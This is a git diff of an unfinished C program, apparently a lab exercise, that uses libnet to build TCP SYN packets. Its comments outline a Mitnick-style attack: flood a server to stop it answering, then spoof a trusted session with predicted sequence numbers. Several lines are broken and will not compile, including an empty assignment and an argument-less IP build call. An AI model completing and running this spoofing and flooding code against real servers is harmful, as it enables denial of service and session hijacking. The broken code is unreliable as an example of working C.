@@ -1,7 +1,7 @@
 #include <libnet.h>
 #include <stdio.h>
 #include <stdlib.h>
-//#include <sys/types>
+#include <common.h>
 #include <unistd.h>
 
 
@@ -20,7 +20,7 @@
 #define PAYLOAD_DOS "disable"
 #define PAYLOAD_RST "enable"
 
-int craft_tcp_packet();
+int send_syn(uint16_t dest_port, uint16_t h_len, const uint8_t *payload, uint32_t payload_s, libnet_t *l, libnet_ptag_t ptag);
 
 int main (void)
 {
@@ -51,19 +51,14 @@ int main (void)
 		exit(EXIT_FAILURE);
 	}
 
-
-	//packet crafting
-	int check = craft_tcp_packet();
-
-
 	//dos the server
 	for (int i = 0; i < 10; i++)
 	{
-		//send packet
-		printf("floooood\n");
+		//craft and send 10 packets with "disable" payload
+		int  = send_syn(PORT, );
 	}
 	//now the server will ignore syn acks, that's exactly what I need because
-	
+
 	//I will send spoofed syn
 	//The xterminal will send real synack to the server
 	//I will respond with spoofed ack cause I know the server seq num
@@ -79,8 +74,39 @@ int main (void)
 }
 
 
-int craft_tcp_packet()
+int send_syn(uint16_t dest_port, uint16_t h_len, const uint8_t *payload, uint32_t payload_s, libnet_t *l, libnet_ptag_t ptag)
 {
-	libnet_ptag_t ptag;
+
+	libnet_ptag_t t;
+	//build syn
+	t = libnet_build_tcp(
+		libnet_get_prand(LIBNET_PRu16), //sp source port
+		dest_port,											//dp destinatin port
+		libnet_get_prand(LIBNET_PRu32), //sequence number
+    libnet_get_prand(LIBNET_PRu32), //ack number, can I send whatever?
+    TH_SYN,													//control bit SYN
+		libnet_get_prand(LIBNET_PRu16), //window size, random is ok?
+		0,															//checksum, if 0 libnet autofills
+		0,															//urgent pointer ???
+		LIBNET_TCP_H,										//len = tcp header + payload len
+		payload,												//payload
+		payload_s,											//payload size
+		l,															//pointer to libnet context
+		ptag														//protocol tag
+	);
+
+	if (t == -1)
+	{
+		printf("error while crafting tcp syn\n");
+		exit(EXIT_FAILURE);
+	}
+
+	//build ip fragment containing syn
+	t = libnet_build_ip(
+
+	)
+
+	//send to server
+
 	return 1;
 }
